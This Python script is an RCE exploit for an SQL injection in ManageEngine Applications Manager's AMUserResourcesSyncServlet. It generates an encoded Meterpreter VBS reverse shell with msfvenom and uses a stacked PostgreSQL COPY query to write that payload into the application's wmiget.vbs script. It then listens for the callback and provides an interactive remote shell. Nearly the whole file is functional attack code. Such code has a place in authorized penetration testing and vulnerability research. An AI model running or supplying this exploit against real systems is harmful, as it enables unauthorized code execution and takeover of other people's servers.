#!/usr/bin/env python3

"""
Author: Aleksa Zatezalo
Date: December 2024
Version: 1.0
Description: RCE exploit for an SQL Injection identified in the ManageEngine AMUserResourceSyncServlet servlet. Works on Windows Systems.
"""

import sys
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
import subprocess
import base64
import threading
import socket


def remove_tabs(input_string):
    """
    Takes a string, input_string, and removes all the tabs from the string.
    The function returns the tab-less string.
    """

    return input_string.replace("\t", "")

def replace_carriage_returns(input_string):
    """
    Takes a string, input_string, and replaces all the carrige returns with a colon.
    The function returns the new string.
    """
    
    return input_string.replace("\n", ":")

def replace_double_colons(input_string):
    """
    Takes a string, input_string, and replaces all double colons ('::') returns with a colon (':').
    The function returns the new string.
    """
    
    return input_string.replace("::", ":")

def base64_encode(input_string):
    """
    Takes a string, input string, and returns a base64 encoded version of input_string.
    """
    
    if isinstance(input_string, str):
        input_string = input_string.encode('utf-8')
    # Encode the bytes to Base64
    encoded_data = base64.b64encode(input_string)
    # Convert the encoded bytes back to a string and return
    return encoded_data.decode('utf-8')

def gen_rev_shell(host, port):
      """
      Generates a vbs revshell using MSFvenom and passes host as listening host, and port as listening port.
      The revshell is returned.
      """

      print("Generating Exploit With MSF Venom. Please Wait...")
      msf_output = 'msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -e x86/shikata_ga_nai -f vbs'.format(lhost = host, lport = port)
      rev_shell = subprocess.run(msf_output,  shell=True, text=True, capture_output=True).stdout
      rev_shell = subprocess.run(msf_output,  shell=True, text=True, capture_output=True).stdout

      return rev_shell

def revShellCopyTo(url, revshell):
    """
    Constructs a SQLi containing a string, revshell, that is copied to a file (wmiget.vbs), on a ManagedEngine instance running on url.
    """

    copy_to =  ';copy+(select+convert_from(decode($${shell}$$,$$base64$$),$$utf-8$$))+to+$$C:\\Program+Files+(x86)\\ManageEngine\\AppManager12\\working\\conf\\\\application\\scripts\\wmiget.vbs$$;'.format(shell=revshell)
    r = requests.get('https://%s:8443/servlet/AMUserResourcesSyncServlet' % url, 
					  params='ForMasRange=1&userId=1%s' % copy_to, verify=False)
    

# Reverse shell request function
def send_rev_shell_request(target, revshell, event):
    """
    Attempts to send a reverse shell, revshell to a vulnerable instance of managed engine, target, using thread, event.
    """
    
    try:
        copy_to = ';copy+(select+convert_from(decode($${shell}$$,$$base64$$),$$utf-8$$))+to+$$C:\\Program+Files+(x86)\\ManageEngine\\AppManager12\\working\\conf\\\\application\\scripts\\wmiget.vbs$$;'.format(shell=revshell)
        r = requests.get(
            'https://%s:8443/servlet/AMUserResourcesSyncServlet' % target,
            params={'ForMasRange': 1, 'userId': f'1{copy_to}'},
            verify=False
        )
        print("[+] Web request sent successfully.")
        event.set()  # Signal that the request is complete
    except Exception as e:
        print(f"[-] Error sending web request: {e}")

# Socket server function
def setup_socket_server(port, event):
    """
    Sets up a listening server, on local port, port, using a thread, event.
    """
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:
        server_socket.bind(('0.0.0.0', int(port)))
        server_socket.listen(1)
        print(f"[+] Listening on port {port}...")
        event.wait()  # Wait for the web request to finish
        print("[+] Reverse shell request completed. Waiting for a connection...")

        conn, addr = server_socket.accept()
        print(f"[+] Connection established with {addr}")
        
        try:
            while True:
                cmd = input("Shell> ")
                if cmd.lower() in ('exit', 'quit'):
                    break
                conn.sendall(cmd.encode() + b'\n')
                data = conn.recv(1024)
                print(data.decode(), end="")
        except KeyboardInterrupt:
            print("\n[!] Exiting...")
        finally:
            conn.close()

# Main function
def main():
    if len(sys.argv) != 4:
        print(f"(+) usage: {sys.argv[0]} <target> <lhost> <lport>")
        print(f"(+) eg: {sys.argv[0]} 192.168.1.10 192.168.1.100 4444")
        sys.exit(1)
    
    # Arguments
    target = sys.argv[1]
    host = sys.argv[2]
    port = sys.argv[3]
    
    # Generate Reverse Shell
    revshell = gen_rev_shell(host, port)
    
    # Multi-threaded loop to get listener
    event = threading.Event()
    request_thread = threading.Thread(target=send_rev_shell_request, args=(target, revshell, event))
    socket_thread = threading.Thread(target=setup_socket_server, args=(port, event))
    
    request_thread.start()
    socket_thread.start()
    
    # Wait for both threads to complete
    request_thread.join()
    socket_thread.join()

if __name__ == '__main__':
    main()